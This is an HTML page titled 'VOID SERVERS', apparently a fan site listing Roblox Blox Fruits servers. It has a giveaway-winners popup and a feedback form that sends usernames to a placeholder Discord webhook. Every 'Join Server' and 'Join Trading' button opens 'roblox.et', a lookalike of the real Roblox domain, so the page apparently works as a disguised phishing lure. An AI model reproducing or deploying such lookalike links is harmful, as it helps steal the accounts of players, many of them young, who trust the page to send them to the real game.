<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VOID SERVERS</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');

        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(to right, #0d001a, #23004d);
            color: white;
            text-align: center;
            padding: 20px;
            overflow-x: hidden;
        }
        header {
            padding: 15px 30px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            box-shadow: 0 0 20px #6a0dad;
            animation: glow 2s infinite alternate;
        }
        .button {
            background: linear-gradient(to right, #6a0dad, #9400D3);
            color: white;
            font-weight: bold;
            padding: 12px 20px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease-in-out;
            margin: 10px;
        }
        .button:hover {
            background: linear-gradient(to right, #9400D3, #6a0dad);
            box-shadow: 0 0 15px #6a0dad;
        }

        /* Giveaway Popup */
        .popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.9);
            padding: 20px;
            width: 300px;
            border-radius: 15px;
            box-shadow: 0 0 15px #FFD700;
            text-align: center;
            display: block; /* Show on page load */
            animation: fadeIn 0.5s ease-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translate(-50%, -60%); }
            to { opacity: 1; transform: translate(-50%, -50%); }
        }
        .popup h2 {
            color: #FFD700;
        }
        .close-btn {
            position: absolute;
            top: 10px;
            right: 15px;
            background: #FFD700;
            color: #000;
            border: none;
            padding: 5px 10px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            transition: 0.3s;
        }
        .close-btn:hover {
            background: #FF8C00;
        }
        .small-text {
            font-size: 12px;
            color: #FFD700;
            margin-top: 5px;
        }

        /* Feedback Form */
        .feedback-form {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            width: 60%;
            margin: auto;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
            margin-top: 20px;
        }
        input, textarea {
            width: 90%;
            padding: 10px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 1em;
        }
        textarea {
            height: 100px;
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header>
        <h1 style="color: #9400D3; animation: glow 2s infinite alternate;">VOID SERVERS</h1>
    </header>

    <!-- Giveaway Winners Popup (Auto Opens) -->
    <div class="popup" id="giveaway-popup">
        <button class="close-btn" onclick="closePopup()">X</button>
        <h2>üèÜ Giveaway Winners</h2>
        <p>ü•á Mainarxd123</p>
        <p>ü•à Supersecretspy5</p>
        <p>ü•â Kajawh1</p>
        <p class="small-text">Updates Everytime I upload a video</p>
    </div>

    <!-- Main Content -->
    <main>
        <h2>üåå BloxFruit Servers</h2>
        <button class="button" onclick="window.open('https://www.roblox.et/games/2753915549/Blox-Fruits', '_blank')">Join Server 1</button>
        <button class="button" onclick="window.open('https://www.roblox.et/games/2753915549/Blox-Fruits', '_blank')">Join Server 2</button>

        <h2>üí∏ Trading Servers</h2>
        <button class="button" onclick="window.open('https://www.roblox.et/games/2753915549/Blox-Fruits', '_blank')">Join Trading</button>

        <!-- Feedback Form -->
        <section class="feedback-form" id="feedback">
            <h2>üìù Submit Feedback</h2>
            <form id="feedback-form">
                <input type="text" id="feedback-user" placeholder="Enter your Roblox username" required>
                <textarea id="feedback-message" placeholder="Your feedback..." required></textarea>
                <button type="submit" class="button">Submit Feedback</button>
            </form>
        </section>
    </main>

    <script>
        // Close Giveaway Winners Popup
        function closePopup() {
            document.getElementById('giveaway-popup').style.display = 'none';
        }

        // Feedback Form Submission
        document.getElementById('feedback-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const username = document.getElementById('feedback-user').value.trim();
            const message = document.getElementById('feedback-message').value.trim();

            if (username && message) {
                const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // Change this

                const payload = {
                    embeds: [{
                        title: "üìù New Feedback Received!",
                        color: 0xFFD700,
                        fields: [
                            { name: "üë§ Roblox Username", value: username, inline: true },
                            { name: "üí¨ Feedback", value: message }
                        ],
                        footer: { text: "VOID SERVERS Feedback" },
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        alert("‚úÖ Feedback submitted successfully! Thank you.");
                        document.getElementById('feedback-form').reset();
                    } else {
                        alert("‚ùå Failed to submit feedback.");
                    }
                })
                .catch(() => {
                    alert("‚ùå Error sending feedback.");
                });
            } else {
                alert("‚ö†Ô∏è Please fill out all fields.");
            }
        });
    </script>

</body>
</html>
